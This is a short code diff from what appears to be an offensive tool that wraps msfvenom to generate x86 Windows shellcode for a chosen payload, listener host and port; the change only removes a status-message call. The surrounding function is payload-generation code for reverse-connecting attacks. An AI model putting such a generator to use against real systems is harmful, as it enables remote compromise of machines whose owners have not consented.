@@ -6,7 +6,6 @@ import subprocess
 def SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT):
     if ARCHITECTURE == "x86":
         MSFVENOM = ['msfvenom', '-a', 'x86', '--platform', 'windows', '-p', PAYLOAD, LHOST, LPORT, '-f', 'c']
-        core.GENERATING_SHELLCODE()
         SHELLCODE = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
         core.SHELLCODE_GENERATED()
         SHELLCODE = UNNECESSARY_CHARACTERS(SHELLCODE)
